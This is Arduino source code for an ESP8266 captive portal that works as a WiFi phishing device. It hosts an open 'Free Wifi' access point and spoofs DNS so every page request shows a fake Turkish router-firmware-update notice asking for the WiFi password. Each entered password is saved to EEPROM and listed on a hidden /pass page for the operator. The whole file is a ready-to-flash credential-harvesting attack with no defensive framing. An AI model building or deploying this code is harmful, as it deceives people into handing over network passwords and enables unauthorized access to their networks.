// Code for ESP8266 Wifi Captive Portal.

// Adding libraries.
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default main strings.
#define SUBTITLE "Yönlendirici bilgisi."
#define TITLE "Güncelleme"
#define BODY "Yönlendirici firmware'iniz güncel değil. Normal taramaya devam etmek için firmware'inizi güncelleyin."
#define POST_TITLE "Updating..."
#define POST_BODY "Yönlendiriciniz güncelleniyor. Lütfen işlem tamamlanana kadar bekleyin.. </br> Teşekkür ederim."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Initial system settings.
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

// Default wifi SSID name.
const char *SSID_NAME = "Free Wifi";

String allPass = "";     // For storing all passwords.
String newSSID = "";     // For adding new SSID.
String currentSSID = ""; // For storing the SSID in the EEPROM.

// For storing passwords in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName)
{
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer()
{
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t)
{
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; text-align:center; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em;  }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 5px; border: 1px solid #555555; color: #000000; }"
               "label { color: #333; display: block; text-align:center; font-style: italic; font-weight: bold; }"
               "nav { background: #fff; color: #ed1b24; text-align:center; display: block; font-size: 1.3em; padding: 0.8em; }"
               "nav b { display: block; text-align:center; font-size: 1.5em; margin-bottom: 0.1em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" +
             a + " :: " + t + "</title>"
                              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                              "<style>" +
             CSS + "</style>"
                   "<meta charset=\"UTF-8\"></head>"
                   "<body><div style=\"text-align:center;\"><img src='data:image/png;base64,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' alt=\"logo\"></div><nav><b>" +
             a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String index()
{
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi sifre:</label>" +
         "<input type=password name=m></input><input type=submit style=background-color: blue; value=Güncelleme></form>" + footer();
}

String posted()
{
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list.
  allPass += pass;                       // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length(); // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass()
{
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid()
{
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>" +
         "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID()
{
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i)
  {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return postedSSID;
}

String clear()
{
  allPass = "";
  passEnd = passStart; // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK()
{
  // The BUILTIN_LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++)
  {
    // For blinking the LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup()
{
  // Starting serial communication.
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first"; // This will will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read SSID in the EEPROM.
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0')
  {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Reading the store password in EEPROM.
    passEnd++;                             // Updating the end location of password in EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);

  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid", []() { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID", []() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass", []() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  // Enable the BUILTIN_LED.
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop()
{
  if ((millis() - lastTick) > TICK_TIMER)
  {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
